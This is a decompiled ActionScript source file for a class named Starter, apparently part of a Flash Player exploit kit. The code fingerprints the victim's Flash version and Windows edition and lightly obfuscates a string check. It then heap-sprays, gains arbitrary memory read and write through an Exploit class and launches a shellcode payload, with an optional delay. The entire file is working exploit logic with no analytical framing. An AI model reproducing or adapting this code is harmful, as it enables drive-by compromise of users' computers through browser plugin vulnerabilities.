package
{
   import flash.utils.ByteArray;
   import flash.utils.Timer;
   import flash.system.System;
   import flash.system.Capabilities;
   import flash.events.Event;
   
   public class Starter
   {
       
      public var exp_class:Exploit = null;
      
      public var bad_mem:Boolean = false;
      
      public var shell:ByteArray = null;
      
      private var timer:Timer = null;
      
      public var os:String = null;
      
      public var player_type:String = null;
      
      public var flash_ver:uint = 0;
      
      public var is_activex:Boolean = false;
      
      public var is_plugin:Boolean = false;
      
      public var is_dbg:Boolean = false;
      
      public var is_standalone:Boolean = false;
      
      public var is_win8:Boolean = false;
      
      public var is_win81:Boolean = false;
      
      public var is_win10:Boolean = false;
      
      public var is_win8_81_10:Boolean = false;
      
      public var is_win8_81_10_activex:Boolean = false;
      
      public var is_win7_xp_activex:Boolean = false;
      
      public var v19:Boolean = false;
      
      public var v18209_13309:Boolean = false;
      
      public var v11_2:Boolean = false;
      
      public var v10:Boolean = false;
      
      public var v11_4:Boolean = false;
      
      public var v11_3:Boolean = false;
      
      public var v11_1:Boolean = false;
      
      private var standalone_allowed:Boolean = true;
      
      private var test_len:uint = 1048576;
      
      private var test_vec:Vector.<Object> = null;
      
      public function Starter(param1:ByteArray)
      {
         super();
         this.shell = param1;
         this.prepare();
      }
      
      private function test_spray() : void
      {
         this.test_vec = new Vector.<Object>(this.test_len);
      }
      
      private function check_mem() : Boolean
      {
         if(this.flash_ver < 110001152)
         {
            this.bad_mem = false;
            return true;
         }
         System.pauseForGCIfCollectionImminent(0);
         var _loc3_:* = System.totalMemory;
         this.test_spray();
         var _loc4_:* = System.totalMemory;
         var _loc2_:uint = _loc4_ - _loc3_;
         var _loc1_:uint = this.test_len * 4 + 65536;
         this.bad_mem = _loc2_ > _loc1_;
         return true;
      }
      
      private function check_versions() : void
      {
         this.v10 = this.flash_ver >= 102152026 && this.flash_ver <= 103183090;
         this.v11_1 = this.flash_ver >= 110001152 && this.flash_ver <= 111102063;
         this.v11_2 = this.flash_ver >= 110001152 && this.flash_ver <= 113300273;
         this.v11_3 = this.flash_ver >= 112202228 && this.flash_ver <= 112202235;
         this.v11_4 = this.flash_ver >= 113300257 && this.flash_ver <= 113300273;
         this.v18209_13309 = this.flash_ver == 180000209 || this.flash_ver == 130000309;
         this.v19 = this.flash_ver >= 190000185;
      }
      
      private function prepare() : void
      {
         this.is_dbg = Capabilities.isDebugger;
         this.os = Capabilities.os.toLowerCase();
         this.player_type = Capabilities.playerType.toLowerCase();
         this.flash_ver = this.get_flash_ver();
         this.check_versions();
         this.check_mem();
         this.exp_class = new Exploit(this);
      }
      
      private function get_flash_ver() : uint
      {
         var _loc2_:uint = 0;
         var _loc3_:uint = 0;
         var _loc1_:String = Capabilities.version.toLowerCase();
         if(_loc1_.length < 4)
         {
            return 0;
         }
         var _loc5_:String = _loc1_.substr(0,4);
         if(_loc5_ != "win ")
         {
            return 0;
         }
         _loc1_ = _loc1_.substr(4);
         var _loc4_:Array = _loc1_.split(",");
         if(_loc4_.length != 4)
         {
            return 0;
         }
         _loc2_ = _loc4_[0];
         _loc3_ = _loc3_ + _loc2_;
         _loc2_ = _loc4_[1];
         _loc3_ = _loc3_ * 10;
         _loc3_ = _loc3_ + _loc2_;
         _loc2_ = _loc4_[2];
         _loc3_ = _loc3_ * 1000;
         _loc3_ = _loc3_ + _loc2_;
         _loc2_ = _loc4_[3];
         _loc3_ = _loc3_ * 1000;
         _loc3_ = _loc3_ + _loc2_;
         return _loc3_;
      }
      
      private function is_vuln() : Boolean
      {
         if(this.flash_ver == 0)
         {
            return false;
         }
         var _loc1_:String = "win";
         _loc1_ = _loc1_ + "dows";
         this.is_activex = this.player_type == "activex";
         this.is_plugin = this.player_type == "plugin";
         this.is_win8 = this.os == _loc1_ + " 8";
         this.is_win81 = this.os == _loc1_ + " 8.1";
         this.is_win10 = this.os == _loc1_ + " 10";
         this.is_win8_81_10 = this.is_win8 || Boolean(this.is_win81) || Boolean(this.is_win10);
         this.is_win8_81_10_activex = this.is_activex && Boolean(this.is_win8_81_10);
         this.is_win7_xp_activex = this.is_activex && !this.is_win8_81_10;
         if(!this.is_activex && !this.is_plugin && Boolean(this.is_dbg))
         {
            this.is_standalone = true;
            if(!this.standalone_allowed)
            {
               return false;
            }
         }
         return this.exp_class.is_vuln(this.flash_ver);
      }
      
      public function read_uint(param1:uint) : uint
      {
         return this.exp_class.read_uint(param1);
      }
      
      public function write_uint(param1:uint, param2:uint) : void
      {
         this.exp_class.write_uint(param1,param2);
      }
      
      private function check_spray_exp() : Boolean
      {
         if(!this.is_vuln())
         {
            return false;
         }
         if(!this.exp_class.spray_obj())
         {
            return false;
         }
         if(!this.exp_class.get_big_ba())
         {
            return false;
         }
         return true;
      }
      
      public function run_payload() : Boolean
      {
         var _loc1_:* = null;
         if(!this.bad_mem)
         {
            _loc1_ = new Payload(this);
            return _loc1_.start();
         }
         return false;
      }
      
      private function run() : Boolean
      {
         if(!this.check_spray_exp())
         {
            return false;
         }
         if(this.exp_class.skip_payload)
         {
            return true;
         }
         return this.run_payload();
      }
      
      private function sleep_end(param1:Event) : void
      {
         this.run();
      }
      
      public function wait_and_run() : Boolean
      {
         if(this.exp_class.sleep == 0)
         {
            return this.run();
         }
         this.timer = new Timer(this.exp_class.sleep,1);
         this.timer.addEventListener("timerComplete",this.sleep_end);
         this.timer.start();
         return true;
      }
   }
}
